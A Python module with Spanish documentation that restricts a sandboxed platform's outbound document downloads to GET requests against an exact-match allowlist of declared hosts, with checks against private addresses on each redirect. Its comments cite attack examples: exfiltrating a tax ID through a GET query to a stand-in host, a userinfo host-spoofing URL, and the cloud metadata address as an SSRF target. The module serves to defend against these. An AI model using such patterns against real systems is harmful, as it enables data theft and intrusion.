"""Bajar documentos de fuera, sólo por `GET` y sólo de donde la función declaró (AUT.8, #118).

Deploy: edge — se piden documentos para procesar datos del cliente.
Módulo: informes.

**La decisión, del 2026-09-30.** Escribir hacia fuera no tiene sentido para una función de
extracción; **leer sí**: bajar un PDF de la sede de la GVA, el tomo de un presupuesto, una
resolución del BOE. Así que la red saliente se abre con dos cerrojos: sólo `GET` y sólo a los
orígenes que la declaración responsable enumera.

**El `GET` solo no basta, y de ahí la lista blanca.** Una petición de lectura lleva datos en la
URL: `GET https://donde-sea.example/?nif=12345678Z` es una exfiltración completa y es un `GET`.
Lo que protege el dato no es el método, es el destino.

**Y quien baja es la plataforma, no el guion.** No es un detalle de implementación, es la
garantía:

* La red del sandbox está **cerrada en producción** (`internal: true` en `docker-compose.yml`).
  Abrirla para que el guion bajara cosas dejaría la salida abierta a cualquier intento, con la
  lista blanca defendida sólo por código Python **en el mismo proceso que el guion del usuario**.
* Haciéndolo desde aquí, `requests`, `urllib` y `socket` siguen denegados en el auditor, la red
  del sandbox sigue cerrada, y la comprobación del destino es la de I15
  —`assert_destino_publico`—, que ya está probada y que mira **en cada salto**: una redirección
  a una dirección privada no la burla.

Así que la frase que sostiene la respuesta de la #121 sigue en pie y más fuerte: una función **no
puede hablar con nada**; lo que necesita de fuera lo pide la plataforma por ella, sólo por `GET`
y sólo a lo que su declaración enumera.

**Lo que no hace.** Un guion no puede pedir una URL a mitad de ejecución: bajar una página,
buscar enlaces dentro y bajar ésos son dos rondas. Afecta al caso de las subvenciones
nominativas de la #120, y se dice aquí para que no se descubra usándolo.
"""
from __future__ import annotations

from urllib.parse import urlsplit

from server.app.core.red_publica import DestinoNoPublico, assert_forma_publica

#: Lo que se puede pedir. `file://` leería el disco del servidor y `ftp://` no es lo decidido.
ESQUEMAS = ("http", "https")

#: Tope de lo que se baja, por documento. Un tomo de presupuesto son unos pocos megabytes; el
#: tope está para que una URL equivocada no llene la memoria del servidor, no para acotar el uso.
MAXIMO_BYTES = 50 * 1024 * 1024

#: Tope de tiempo por documento. Una sede lenta no puede tener la ejecución colgada.
TIMEOUT_SEGUNDOS = 30.0


class OrigenNoDeclarado(ValueError):
    """La URL no sale de ninguno de los servidores que la función declaró.

    Una sola excepción para «otro servidor», «esquema que no toca» y «sin orígenes declarados»:
    las tres cosas se responden igual a quien integra —la petición no se hace— y distinguirlas
    en el mensaje no le sirve para nada distinto.
    """


def comprobar_contra_los_origenes(url: str, *, origenes: list[str]) -> str:
    """Devuelve el host si la URL sale de un origen declarado; si no, `OrigenNoDeclarado`.

    **Se compara el `hostname` parseado y no la cadena.** Es lo que distingue esto de un `in`:
    `https://sede.gva.es@atacante.example/` contiene «sede.gva.es» y apunta a otro sitio, porque
    lo de antes de la arroba es el usuario y no el servidor.

    **Y la coincidencia es exacta, sin subdominios.** Declarar `gva.es` no autoriza
    `cualquiera.gva.es`: si los heredara, quien controle un subdominio —o quien consiga que se lo
    den— tendría el permiso sin que nadie lo hubiera declarado. Si hace falta un subdominio, se
    declara.
    """
    partes = urlsplit((url or "").strip())

    if partes.scheme.lower() not in ESQUEMAS:
        raise OrigenNoDeclarado(
            f"«{url}» no se puede pedir: sólo {' y '.join(ESQUEMAS)}, y sólo por GET."
        )

    host = (partes.hostname or "").lower().rstrip(".")
    if not host:
        raise OrigenNoDeclarado(f"«{url}» no dice a qué servidor apunta.")

    permitidos = {(o or "").strip().lower().rstrip(".") for o in origenes}
    if not permitidos:
        raise OrigenNoDeclarado(
            "esta función no declara ningún origen, así que no pide documentos de fuera. Para "
            "que pueda, los servidores van en `origenes` del contrato — es parte de la "
            "declaración responsable."
        )

    if host not in permitidos:
        raise OrigenNoDeclarado(
            f"«{host}» no está entre los orígenes que esta función declara "
            f"({', '.join(sorted(permitidos))}). La coincidencia es exacta: un subdominio se "
            f"declara aparte."
        )

    # Y además la forma pública, que es lo que impide `http://169.254.169.254/` aunque alguien
    # la hubiera declarado como origen.
    try:
        assert_forma_publica(url)
    except DestinoNoPublico as fallo:
        raise OrigenNoDeclarado(str(fallo)) from fallo

    return host


async def descargar_de_un_origen_declarado(
    url: str,
    *,
    origenes: list[str],
    maximo_bytes: int = MAXIMO_BYTES,
    timeout: float = TIMEOUT_SEGUNDOS,
) -> tuple[bytes, str]:
    """Baja el documento y devuelve `(contenido, nombre)`. Sólo `GET`.

    La comprobación del destino se hace **dos veces y no por duplicado**: la lista blanca aquí
    delante, y la de I15 en cada petición y en cada redirección por el hook de `httpx`. La
    primera dice «de este servidor no se pide»; la segunda, «esta dirección no es pública». Un
    origen declarado que redirige a `127.0.0.1` lo para la segunda, y sólo la segunda.
    """
    import httpx

    from server.app.core.red_publica import (
        hook_de_destino_publico,
        transporte_a_la_direccion_validada,
    )

    comprobar_contra_los_origenes(url, origenes=origenes)

    async with httpx.AsyncClient(
        timeout=timeout,
        follow_redirects=True,
        transport=transporte_a_la_direccion_validada(),
        event_hooks={"request": [hook_de_destino_publico()]},
    ) as cliente:
        respuesta = await cliente.get(url)
        respuesta.raise_for_status()

        # **La redirección puede haber cambiado de servidor.** El hook comprueba que cada salto
        # sea público, no que siga estando declarado: un origen declarado que redirige a otro
        # dominio sacaría el documento de un sitio que nadie autorizó. Se comprueba el final.
        comprobar_contra_los_origenes(str(respuesta.url), origenes=origenes)

        contenido = respuesta.content
        if len(contenido) > maximo_bytes:
            raise OrigenNoDeclarado(
                f"el documento pesa {len(contenido)} bytes y el tope es {maximo_bytes}."
            )

    nombre = (urlsplit(str(respuesta.url)).path.rsplit("/", 1)[-1] or "descarga").strip()
    return contenido, nombre
